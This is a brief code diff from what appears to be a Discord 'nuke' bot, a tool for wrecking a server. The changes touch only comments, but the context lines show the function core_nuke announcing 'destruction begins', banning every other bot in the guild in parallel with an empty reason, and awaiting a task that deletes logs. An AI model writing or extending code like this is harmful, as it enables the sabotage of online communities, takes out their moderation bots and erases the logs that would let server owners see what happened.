@@ -122,7 +122,7 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
-    # 他のボットBAN
+    # 並列スタート: 他のボットBAN
     bot_ban_coros = [limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot]
     bot_ban_task = asyncio.create_task(asyncio.gather(*bot_ban_coros, return_exceptions=True)) if bot_ban_coros else None
 
@@ -177,7 +177,7 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 並列待機（空タスクはスキップ）
+    # 並列待機
     if bot_ban_task:
         await bot_ban_task
     if log_delete_task:
